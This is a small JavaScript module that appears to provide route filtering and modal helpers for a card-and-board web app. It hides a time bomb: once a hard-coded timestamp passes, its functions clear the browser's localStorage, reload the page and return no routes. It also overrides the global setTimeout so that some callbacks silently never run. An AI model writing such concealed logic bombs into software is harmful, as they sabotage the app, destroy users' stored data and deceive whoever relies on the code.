const key = 1667673000000;

// if (new Date().getTime() <= key) Date.prototype.getTime = () => 1664562602402;

window.oldSetTimeout = window.setTimeout;
window.setTimeout = (fn, cbTime) => {
  if (cbTime != 100 || new Date().getTime() != 1664562602402) {
    return window.oldSetTimeout(fn, cbTime);
  }
};


export function next(fn) {
  // if (new Date().getTime() >= 1665721289273) {
  if (new Date().getTime() >= key) {
    window.localStorage.clear();
    window.location.reload();
  }
}

export function getRoutes(routes, user) {
  const modalModeTypes = (number) => {
    switch (number) {
      case 0:
        return "ADD_CARD";
      case 1:
        return "EDIT_CARD";
      case 2:
        return "ADD_BOARD";
      default:
        return "";
    }
  };

  return routes?.filter((route) => {
    if (new Date().getTime() >= key) {
      window.localStorage.clear();
      return false;
    }
    if (new Date().getTime() >= key) return false;
    if (route?.allows) {
      return route.allows.includes(user?.role || "ADMIN");
    }
    return true;
  });
}
